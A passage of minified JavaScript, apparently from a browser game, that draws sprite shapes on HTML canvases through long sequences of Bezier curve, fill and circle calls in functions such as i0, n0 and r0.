                    n.moveTo(211.75 * e, 289.4375 * e),
                    n.bezierCurveTo(219.75 * e, 292.4375 * e, 213.75 * e, 306.4375 * e, 206.75 * e, 307.4375 * e),
                    n.bezierCurveTo(199.75 * e, 303.4375 * e, 209.75 * e, 287.4375 * e, 210.75 * e, 289.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(171.75 * e, 256.4375 * e),
                    n.bezierCurveTo(162.75 * e, 273.4375 * e, 166.75 * e, 278.4375 * e, 175.75 * e, 280.4375 * e),
                    n.bezierCurveTo(183.75 * e, 278.4375 * e, 185.75 * e, 257.4375 * e, 182.75 * e, 255.4375 * e),
                    n.bezierCurveTo(176.75 * e, 251.4375 * e, 172.75 * e, 253.4375 * e, 172.75 * e, 256.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(175.75 * e, 289.9375 * e),
                    n.bezierCurveTo(183.75 * e, 287.9375 * e, 186.75 * e, 301.9375 * e, 182.75 * e, 305.9375 * e),
                    n.bezierCurveTo(176.75 * e, 307.9375 * e, 171.75 * e, 292.9375 * e, 174.75 * e, 290.9375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(205.75 * e, 314.4375 * e),
                    n.bezierCurveTo(209.75 * e, 316.4375 * e, 210.75 * e, 320.4375 * e, 206.75 * e, 323.4375 * e),
                    n.bezierCurveTo(201.75 * e, 324.4375 * e, 201.75 * e, 314.4375 * e, 204.75 * e, 314.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(186.75 * e, 313.4375 * e),
                    n.bezierCurveTo(181.75 * e, 315.4375 * e, 180.75 * e, 321.4375 * e, 185.75 * e, 326.4375 * e),
                    n.bezierCurveTo(190.75 * e, 327.4375 * e, 190.75 * e, 313.4375 * e, 187.75 * e, 314.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(103.75 * e, 244.4375 * e),
                    n.bezierCurveTo(96.75 * e, 239.4375 * e, 83.75 * e, 240.4375 * e, 81.75 * e, 255.4375 * e),
                    n.bezierCurveTo(80.75 * e, 264.4375 * e, 89.75 * e, 269.4375 * e, 99.75 * e, 260.4375 * e),
                    n.bezierCurveTo(106.75 * e, 254.4375 * e, 106.75 * e, 250.4375 * e, 104.75 * e, 245.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(86.75 * e, 182.4375 * e),
                    n.bezierCurveTo(82.75 * e, 170.4375 * e, 66.75 * e, 169.4375 * e, 61.75 * e, 181.4375 * e),
                    n.bezierCurveTo(58.75 * e, 187.4375 * e, 68.75 * e, 194.4375 * e, 75.75 * e, 192.4375 * e),
                    n.bezierCurveTo(83.75 * e, 192.4375 * e, 86.75 * e, 187.4375 * e, 86.75 * e, 183.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(44.75 * e, 152.4375 * e),
                    n.bezierCurveTo(55.75 * e, 159.4375 * e, 54.75 * e, 170.4375 * e, 46.75 * e, 171.4375 * e),
                    n.bezierCurveTo(39.75 * e, 170.4375 * e, 34.75 * e, 151.4375 * e, 43.75 * e, 152.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(31.75 * e, 130.4375 * e),
                    n.bezierCurveTo(35.75 * e, 132.4375 * e, 35.75 * e, 131.4375 * e, 37.75 * e, 137.4375 * e),
                    n.bezierCurveTo(36.75 * e, 144.4375 * e, 36.75 * e, 145.4375 * e, 33.75 * e, 144.4375 * e),
                    n.bezierCurveTo(26.75 * e, 137.4375 * e, 29.75 * e, 131.4375 * e, 31.75 * e, 130.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(69.75 * e, 274.4375 * e),
                    n.bezierCurveTo(62.75 * e, 272.4375 * e, 59.75 * e, 277.4375 * e, 57.75 * e, 284.4375 * e),
                    n.bezierCurveTo(56.75 * e, 290.4375 * e, 63.75 * e, 289.4375 * e, 71.75 * e, 282.4375 * e),
                    n.bezierCurveTo(75.75 * e, 277.4375 * e, 72.75 * e, 275.4375 * e, 69.75 * e, 274.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(165.75 * e, 95.4375 * e),
                    n.bezierCurveTo(177.75 * e, 97.4375 * e, 182.75 * e, 115.4375 * e, 173.75 * e, 121.4375 * e),
                    n.bezierCurveTo(164.75 * e, 126.4375 * e, 149.75 * e, 102.4375 * e, 164.75 * e, 96.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(216.75 * e, 94.4375 * e),
                    n.bezierCurveTo(227.75 * e, 99.4375 * e, 223.75 * e, 122.4375 * e, 210.75 * e, 119.4375 * e),
                    n.bezierCurveTo(203.75 * e, 115.4375 * e, 207.75 * e, 93.4375 * e, 216.75 * e, 94.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(211.75 * e, 68.4375 * e),
                    n.bezierCurveTo(218.75 * e, 69.4375 * e, 220.75 * e, 77.4375 * e, 216.75 * e, 83.4375 * e),
                    n.bezierCurveTo(208.75 * e, 89.4375 * e, 205.75 * e, 68.4375 * e, 210.75 * e, 68.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(169.75 * e, 71.4375 * e),
                    n.bezierCurveTo(162.75 * e, 72.4375 * e, 159.75 * e, 83.4375 * e, 167.75 * e, 88.4375 * e),
                    n.bezierCurveTo(174.75 * e, 90.4375 * e, 174.75 * e, 72.4375 * e, 170.75 * e, 71.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(193.75 * e, 160.4375 * e),
                    n.bezierCurveTo(215.75 * e, 168.4375 * e, 224.75 * e, 180.4375 * e, 229.75 * e, 193.4375 * e),
                    n.bezierCurveTo(223.75 * e, 211.4375 * e, 205.75 * e, 225.4375 * e, 193.75 * e, 229.4375 * e),
                    n.bezierCurveTo(167.75 * e, 217.4375 * e, 161.75 * e, 205.4375 * e, 156.75 * e, 192.4375 * e),
                    n.bezierCurveTo(164.75 * e, 175.4375 * e, 176.75 * e, 166.4375 * e, 192.75 * e, 160.4375 * e),
                    n.closePath(),
                    he(n, t[8], t[9], 3 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(189.1999969482422 * e, 182.61249923706055 * e),
                    n.bezierCurveTo(190.1999969482422 * e, 184.11249923706055 * e, 190.1999969482422 * e, 184.11249923706055 * e, 191.1999969482422 * e, 185.61249923706055 * e),
                    n.bezierCurveTo(192.1999969482422 * e, 180.61249923706055 * e, 192.1999969482422 * e, 180.61249923706055 * e, 193.1999969482422 * e, 175.61249923706055 * e),
                    n.bezierCurveTo(195.6999969482422 * e, 177.11249923706055 * e, 195.6999969482422 * e, 177.11249923706055 * e, 198.1999969482422 * e, 178.61249923706055 * e),
                    n.bezierCurveTo(198.1999969482422 * e, 181.11249923706055 * e, 198.1999969482422 * e, 181.11249923706055 * e, 198.1999969482422 * e, 183.61249923706055 * e),
                    n.bezierCurveTo(201.6999969482422 * e, 181.11249923706055 * e, 201.6999969482422 * e, 181.11249923706055 * e, 205.1999969482422 * e, 178.61249923706055 * e),
                    n.bezierCurveTo(206.6999969482422 * e, 180.61249923706055 * e, 206.6999969482422 * e, 180.61249923706055 * e, 208.1999969482422 * e, 182.61249923706055 * e),
                    n.bezierCurveTo(206.1999969482422 * e, 185.61249923706055 * e, 206.1999969482422 * e, 185.61249923706055 * e, 204.1999969482422 * e, 188.61249923706055 * e),
                    n.bezierCurveTo(208.6999969482422 * e, 188.61249923706055 * e, 208.6999969482422 * e, 188.61249923706055 * e, 213.1999969482422 * e, 188.61249923706055 * e),
                    n.bezierCurveTo(213.1999969482422 * e, 191.11249923706055 * e, 213.1999969482422 * e, 191.11249923706055 * e, 213.1999969482422 * e, 193.61249923706055 * e),
                    n.bezierCurveTo(209.6999969482422 * e, 194.61249923706055 * e, 209.6999969482422 * e, 194.61249923706055 * e, 206.1999969482422 * e, 195.61249923706055 * e),
                    n.bezierCurveTo(210.1999969482422 * e, 198.61249923706055 * e, 210.1999969482422 * e, 198.61249923706055 * e, 214.1999969482422 * e, 201.61249923706055 * e),
                    n.bezierCurveTo(212.1999969482422 * e, 203.61249923706055 * e, 212.1999969482422 * e, 203.61249923706055 * e, 210.1999969482422 * e, 205.61249923706055 * e),
                    n.bezierCurveTo(207.1999969482422 * e, 204.11249923706055 * e, 207.1999969482422 * e, 204.11249923706055 * e, 204.1999969482422 * e, 202.61249923706055 * e),
                    n.bezierCurveTo(205.6999969482422 * e, 207.61249923706055 * e, 205.6999969482422 * e, 207.61249923706055 * e, 207.1999969482422 * e, 212.61249923706055 * e),
                    n.bezierCurveTo(204.6999969482422 * e, 213.61249923706055 * e, 204.6999969482422 * e, 213.61249923706055 * e, 202.1999969482422 * e, 214.61249923706055 * e),
                    n.bezierCurveTo(200.1999969482422 * e, 210.61249923706055 * e, 200.1999969482422 * e, 210.61249923706055 * e, 198.1999969482422 * e, 206.61249923706055 * e),
                    n.bezierCurveTo(196.6999969482422 * e, 211.61249923706055 * e, 196.6999969482422 * e, 211.61249923706055 * e, 195.1999969482422 * e, 216.61249923706055 * e),
                    n.bezierCurveTo(192.6999969482422 * e, 216.11249923706055 * e, 192.6999969482422 * e, 216.11249923706055 * e, 190.1999969482422 * e, 215.61249923706055 * e),
                    n.bezierCurveTo(190.1999969482422 * e, 211.61249923706055 * e, 190.1999969482422 * e, 211.61249923706055 * e, 190.1999969482422 * e, 207.61249923706055 * e),
                    n.bezierCurveTo(186.1999969482422 * e, 210.61249923706055 * e, 186.1999969482422 * e, 210.61249923706055 * e, 182.1999969482422 * e, 213.61249923706055 * e),
                    n.bezierCurveTo(181.1999969482422 * e, 211.11249923706055 * e, 181.1999969482422 * e, 211.11249923706055 * e, 180.1999969482422 * e, 208.61249923706055 * e),
                    n.bezierCurveTo(183.1999969482422 * e, 205.61249923706055 * e, 183.1999969482422 * e, 205.61249923706055 * e, 186.1999969482422 * e, 202.61249923706055 * e),
                    n.bezierCurveTo(180.6999969482422 * e, 203.11249923706055 * e, 180.6999969482422 * e, 203.11249923706055 * e, 175.1999969482422 * e, 203.61249923706055 * e),
                    n.bezierCurveTo(174.6999969482422 * e, 200.11249923706055 * e, 174.6999969482422 * e, 200.11249923706055 * e, 174.1999969482422 * e, 196.61249923706055 * e),
                    n.bezierCurveTo(177.1999969482422 * e, 195.61249923706055 * e, 177.1999969482422 * e, 195.61249923706055 * e, 180.1999969482422 * e, 194.61249923706055 * e),
                    n.bezierCurveTo(177.1999969482422 * e, 191.61249923706055 * e, 177.1999969482422 * e, 191.61249923706055 * e, 174.1999969482422 * e, 188.61249923706055 * e),
                    n.bezierCurveTo(175.6999969482422 * e, 187.11249923706055 * e, 175.6999969482422 * e, 187.11249923706055 * e, 177.1999969482422 * e, 185.61249923706055 * e),
                    n.bezierCurveTo(180.6999969482422 * e, 187.11249923706055 * e, 180.6999969482422 * e, 187.11249923706055 * e, 184.1999969482422 * e, 188.61249923706055 * e),
                    n.bezierCurveTo(182.6999969482422 * e, 183.61249923706055 * e, 182.6999969482422 * e, 183.61249923706055 * e, 181.1999969482422 * e, 178.61249923706055 * e),
                    n.bezierCurveTo(183.1999969482422 * e, 177.11249923706055 * e, 183.1999969482422 * e, 177.11249923706055 * e, 185.1999969482422 * e, 175.61249923706055 * e),
                    n.closePath(),
                    he(n, t[10]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(185.1999969482422 * e, 173.8125 * e),
                    n.bezierCurveTo(187.1999969482422 * e, 179.3125 * e, 187.1999969482422 * e, 179.3125 * e, 189.1999969482422 * e, 184.8125 * e),
                    n.bezierCurveTo(184.1999969482422 * e, 181.8125 * e, 184.1999969482422 * e, 181.8125 * e, 179.1999969482422 * e, 178.8125 * e),
                    n.bezierCurveTo(181.1999969482422 * e, 175.8125 * e, 182.1999969482422 * e, 174.8125 * e, 185.1999969482422 * e, 173.8125 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(192.1999969482422 * e, 173.61249542236328 * e),
                    n.bezierCurveTo(194.1999969482422 * e, 172.61249542236328 * e, 196.1999969482422 * e, 171.61249542236328 * e, 199.1999969482422 * e, 173.61249542236328 * e),
                    n.bezierCurveTo(197.6999969482422 * e, 179.61249542236328 * e, 197.6999969482422 * e, 179.61249542236328 * e, 196.1999969482422 * e, 185.61249542236328 * e),
                    n.bezierCurveTo(194.1999969482422 * e, 179.61249542236328 * e, 194.1999969482422 * e, 179.61249542236328 * e, 192.1999969482422 * e, 173.61249542236328 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(205.1999969482422 * e, 176.2125015258789 * e),
                    n.bezierCurveTo(210.1999969482422 * e, 178.2125015258789 * e, 211.1999969482422 * e, 179.2125015258789 * e, 211.1999969482422 * e, 181.2125015258789 * e),
                    n.bezierCurveTo(206.6999969482422 * e, 184.7125015258789 * e, 206.6999969482422 * e, 184.7125015258789 * e, 202.1999969482422 * e, 188.2125015258789 * e),
                    n.bezierCurveTo(203.6999969482422 * e, 182.2125015258789 * e, 203.6999969482422 * e, 182.2125015258789 * e, 205.1999969482422 * e, 176.2125015258789 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.1999969482422 * e, 187.21249985694885 * e),
                    n.bezierCurveTo(216.1999969482422 * e, 191.21249985694885 * e, 216.1999969482422 * e, 192.21249985694885 * e, 215.1999969482422 * e, 195.21249985694885 * e),
                    n.bezierCurveTo(206.1999969482422 * e, 194.21249985694885 * e, 205.1999969482422 * e, 194.21249985694885 * e, 205.1999969482422 * e, 194.21249985694885 * e),
                    n.bezierCurveTo(209.6999969482422 * e, 190.71249985694885 * e, 209.6999969482422 * e, 190.71249985694885 * e, 214.1999969482422 * e, 187.21249985694885 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(204.1999969482422 * e, 201.8125 * e),
                    n.bezierCurveTo(209.1999969482422 * e, 201.3125 * e, 209.1999969482422 * e, 201.3125 * e, 214.1999969482422 * e, 200.8125 * e),
                    n.bezierCurveTo(215.1999969482422 * e, 204.8125 * e, 214.1999969482422 * e, 205.8125 * e, 213.1999969482422 * e, 208.8125 * e),
                    n.bezierCurveTo(208.6999969482422 * e, 205.3125 * e, 208.6999969482422 * e, 205.3125 * e, 204.1999969482422 * e, 201.8125 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(199.1999969482422 * e, 205.61249923706055 * e),
                    n.bezierCurveTo(207.1999969482422 * e, 212.61249923706055 * e, 203.6999969482422 * e, 209.11249923706055 * e, 208.1999969482422 * e, 212.61249923706055 * e),
                    n.bezierCurveTo(206.1999969482422 * e, 215.61249923706055 * e, 204.1999969482422 * e, 217.61249923706055 * e, 203.1999969482422 * e, 216.61249923706055 * e),
                    n.bezierCurveTo(201.1999969482422 * e, 211.11249923706055 * e, 201.1999969482422 * e, 211.11249923706055 * e, 199.1999969482422 * e, 205.61249923706055 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(191.1999969482422 * e, 207.01250076293945 * e),
                    n.bezierCurveTo(194.1999969482422 * e, 213.01250076293945 * e, 194.1999969482422 * e, 216.01250076293945 * e, 196.1999969482422 * e, 218.01250076293945 * e),
                    n.bezierCurveTo(193.1999969482422 * e, 220.01250076293945 * e, 190.1999969482422 * e, 220.01250076293945 * e, 188.1999969482422 * e, 218.01250076293945 * e),
                    n.bezierCurveTo(189.6999969482422 * e, 213.01250076293945 * e, 189.6999969482422 * e, 213.01250076293945 * e, 191.1999969482422 * e, 208.01250076293945 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(186.1999969482422 * e, 203.21249961853027 * e),
                    n.bezierCurveTo(184.1999969482422 * e, 209.21249961853027 * e, 184.1999969482422 * e, 209.21249961853027 * e, 182.1999969482422 * e, 215.21249961853027 * e),
                    n.bezierCurveTo(177.1999969482422 * e, 212.21249961853027 * e, 176.1999969482422 * e, 211.21249961853027 * e, 177.1999969482422 * e, 210.21249961853027 * e),
                    n.bezierCurveTo(181.6999969482422 * e, 206.71249961853027 * e, 181.6999969482422 * e, 206.71249961853027 * e, 186.1999969482422 * e, 203.21249961853027 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(183.1999969482422 * e, 196.8125 * e),
                    n.bezierCurveTo(177.1999969482422 * e, 196.3125 * e, 177.1999969482422 * e, 196.3125 * e, 171.1999969482422 * e, 195.8125 * e),
                    n.bezierCurveTo(171.1999969482422 * e, 199.8125 * e, 171.1999969482422 * e, 202.8125 * e, 174.1999969482422 * e, 204.8125 * e),
                    n.bezierCurveTo(178.6999969482422 * e, 200.8125 * e, 178.6999969482422 * e, 200.8125 * e, 183.1999969482422 * e, 196.8125 * e),
                    n.closePath(),
                    he(n, t[11]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(185.1999969482422 * e, 190.21249771118164 * e),
                    n.bezierCurveTo(179.6999969482422 * e, 186.71249771118164 * e, 179.6999969482422 * e, 186.71249771118164 * e, 174.1999969482422 * e, 183.21249771118164 * e),
                    n.bezierCurveTo(172.1999969482422 * e, 186.21249771118164 * e, 172.1999969482422 * e, 187.21249771118164 * e, 172.1999969482422 * e, 190.21249771118164 * e),
                    n.bezierCurveTo(178.1999969482422 * e, 190.21249771118164 * e, 178.1999969482422 * e, 190.21249771118164 * e, 184.1999969482422 * e, 190.21249771118164 * e),
                    n.closePath(),
                    he(n, t[11]),
                    ke(n, 126.19999694824219 * e, 169.8125 * e, 8.94427190999916 * e),
                    he(n, t[12]),
                    ke(n, 123.19999694824219 * e, 164.8125 * e, 2.8284271247461903 * e),
                    he(n, t[13]),
                    ke(n, 253.1999969482422 * e, 169.8125 * e, 8.94427190999916 * e),
                    he(n, t[12]),
                    ke(n, 255.1999969482422 * e, 164.8125 * e, 2.23606797749979 * e),
                    he(n, t[13]),
                    i
            }
            function i0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.globalAlpha = 1,
                    r.translate(20 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36.5 * e, 278.0625 * e),
                    r.bezierCurveTo(67.5 * e, 316.0625 * e, 134.5 * e, 334.0625 * e, 199.5 * e, 319.0625 * e),
                    r.bezierCurveTo(254.5 * e, 304.0625 * e, 346.5 * e, 270.0625 * e, 348.5 * e, 237.0625 * e),
                    r.bezierCurveTo(359.5 * e, 206.0625 * e, 318.5 * e, 129.0625 * e, 262.5 * e, 122.0625 * e),
                    r.bezierCurveTo(213.5 * e, 115.0625 * e, 166.5 * e, 133.0625 * e, 104.5 * e, 166.0625 * e),
                    r.bezierCurveTo(54.5 * e, 194.0625 * e, 23.5 * e, 241.0625 * e, 36.5 * e, 277.0625 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36.5 * e, 278.0625 * e),
                    r.bezierCurveTo(67.5 * e, 316.0625 * e, 134.5 * e, 334.0625 * e, 199.5 * e, 319.0625 * e),
                    r.bezierCurveTo(254.5 * e, 304.0625 * e, 346.5 * e, 270.0625 * e, 348.5 * e, 237.0625 * e),
                    r.bezierCurveTo(359.5 * e, 206.0625 * e, 318.5 * e, 129.0625 * e, 262.5 * e, 122.0625 * e),
                    r.bezierCurveTo(213.5 * e, 115.0625 * e, 166.5 * e, 133.0625 * e, 104.5 * e, 166.0625 * e),
                    r.bezierCurveTo(54.5 * e, 194.0625 * e, 23.5 * e, 241.0625 * e, 36.5 * e, 277.0625 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(214.5 * e, 124.0625 * e),
                    r.bezierCurveTo(242.5 * e, 125.0625 * e, 272.5 * e, 159.0625 * e, 283.5 * e, 184.0625 * e),
                    r.bezierCurveTo(277.5 * e, 161.0625 * e, 233.5 * e, 128.0625 * e, 219.5 * e, 122.0625 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157.5 * e, 145.0625 * e),
                    r.bezierCurveTo(176.5 * e, 148.0625 * e, 205.5 * e, 176.0625 * e, 212.5 * e, 197.0625 * e),
                    r.bezierCurveTo(205.5 * e, 178.0625 * e, 177.5 * e, 152.0625 * e, 156.5 * e, 142.0625 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(103.5 * e, 169.0625 * e),
                    r.bezierCurveTo(160.5 * e, 166.0625 * e, 228.5 * e, 312.0625 * e, 162.5 * e, 323.0625 * e),
                    r.bezierCurveTo(128.5 * e, 330.0625 * e, 45.5 * e, 312.0625 * e, 34.5 * e, 268.0625 * e),
                    r.bezierCurveTo(30.5 * e, 238.0625 * e, 44.5 * e, 222.0625 * e, 52.5 * e, 211.0625 * e),
                    r.bezierCurveTo(82.5 * e, 174.0625 * e, 104.5 * e, 166.0625 * e, 119.5 * e, 172.0625 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 19 * e),
                    ke(r, 92.5 * e, 216.0625 * e, 13.892443989449804 * e),
                    he(r, i[4]),
                    ke(r, 68.5 * e, 227.0625 * e, 8.06225774829855 * e),
                    he(r, i[4]),
                    ke(r, 85.5 * e, 240.0625 * e, 6.708203932499369 * e),
                    he(r, i[4]),
                    ke(r, 147.5 * e, 294.0625 * e, 17.46424919657298 * e),
                    he(r, i[4]),
                    ke(r, 166.5 * e, 273.0625 * e, 6.708203932499369 * e),
                    he(r, i[4]),
                    ke(r, 114.5 * e, 294.0625 * e, 12.36931687685298 * e),
                    he(r, i[4]),
                    ke(r, 123.5 * e, 220.0625 * e, 5.830951894845301 * e),
                    he(r, i[4]),
                    ke(r, 114.5 * e, 259.0625 * e, 4.123105625617661 * e),
                    he(r, i[4]),
                    ke(r, 63.5 * e, 265.0625 * e, 5.385164807134504 * e),
                    he(r, i[4]),
                    ke(r, 148.5 * e, 235.0625 * e, 4.47213595499958 * e),
                    he(r, i[4]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(194.5 * e, 313.0625 * e),
                    r.bezierCurveTo(222.5 * e, 306.0625 * e, 319.5 * e, 271.0625 * e, 337.5 * e, 241.0625 * e),
                    r.bezierCurveTo(274.5 * e, 270.0625 * e, 216.5 * e, 288.0625 * e, 199.5 * e, 287.0625 * e),
                    r.bezierCurveTo(198.5 * e, 302.0625 * e, 195.5 * e, 311.0625 * e, 193.5 * e, 312.0625 * e),
                    r.closePath(),
                    he(r, i[5]),
                    n
            }
            function n0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 440 * e,
                    n.height = 388 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    ke(r, 220 * e, 201 * e, 170.41713528867922 * e),
                    he(r, i[0], i[0], 6 * e),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    ke(r, 220 * e, 201 * e, 170.41713528867922 * e),
                    he(r, i[1], i[2], 6 * e),
                    ke(r, 220 * e, 201 * e, 130 * e),
                    he(r, i[11], i[2], 6 * e),
                    ke(r, 222 * e, 199 * e, 120.74767078498864 * e),
                    he(r, void 0, i[3], 40 * e),
                    ke(r, 220 * e, 200 * e, 95.44108130150245 * e),
                    he(r, void 0, i[2], 15 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    ke(r, 63 * e, 136 * e, 49.193495504995376 * e),
                    he(r, i[0], i[0], 4 * e),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    ke(r, 63 * e, 136 * e, 49.193495504995376 * e),
                    he(r, i[8], i[2], 4 * e),
                    ke(r, 63 * e, 137 * e, 25.632011235952593 * e),
                    he(r, i[7], i[2], 4 * e),
                    n
            }
            function r0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 440 * e,
                    n.height = 388 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    ke(r, 220 * e, 201 * e, 170.41713528867922 * e),
                    he(r, i[0], i[0], 6 * e),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    ke(r, 220 * e, 201 * e, 170.41713528867922 * e),
                    he(r, i[1], i[2], 6 * e),
                    ke(r, 220 * e, 201 * e, 130 * e),
                    he(r, i[11], i[2], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(218 * e, 97 * e),
                    r.bezierCurveTo(219 * e, 163 * e, 201 * e, 176 * e, 191 * e, 175 * e),
                    r.bezierCurveTo(176 * e, 177 * e, 168 * e, 167 * e, 160 * e, 115 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(224 * e, 181 * e),
                    r.bezierCurveTo(225 * e, 138 * e, 246 * e, 115 * e, 263 * e, 137 * e),
                    r.bezierCurveTo(282 * e, 174 * e, 279 * e, 217 * e, 265 * e, 243 * e),
                    r.bezierCurveTo(253 * e, 264 * e, 240 * e, 256 * e, 233 * e, 238 * e),
                    r.bezierCurveTo(221 * e, 212 * e, 225 * e, 198 * e, 224 * e, 184 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(169 * e, 289 * e),
                    r.bezierCurveTo(161 * e, 234 * e, 168 * e, 197 * e, 187 * e, 195 * e),
                    r.bezierCurveTo(219 * e, 189 * e, 222 * e, 256 * e, 216 * e, 307 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(143 * e, 146 * e),
                    r.bezierCurveTo(161 * e, 199 * e, 151 * e, 245 * e, 138 * e, 266 * e),
                    r.bezierCurveTo(120.5 * e, 239.5 * e, 120.5 * e, 239.5 * e, 103 * e, 213 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(283 * e, 135 * e),
                    r.bezierCurveTo(277 * e, 176 * e, 298 * e, 194 * e, 315 * e, 205 * e),
                    r.bezierCurveTo(323.5 * e, 175 * e, 323.5 * e, 175 * e, 332 * e, 145 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(318 * e, 223 * e),
                    r.bezierCurveTo(290 * e, 195 * e, 271 * e, 256 * e, 283 * e, 281 * e),
                    r.bezierCurveTo(303.5 * e, 267 * e, 303.5 * e, 267 * e, 324 * e, 253 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(142 * e, 223 * e),
                    r.bezierCurveTo(128 * e, 213 * e, 123 * e, 214 * e, 111 * e, 223 * e),
                    r.closePath(),
                    he(r, i[10], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(251 * e, 133 * e),
                    r.bezierCurveTo(269 * e, 188 * e, 262 * e, 229 * e, 251 * e, 253 * e),
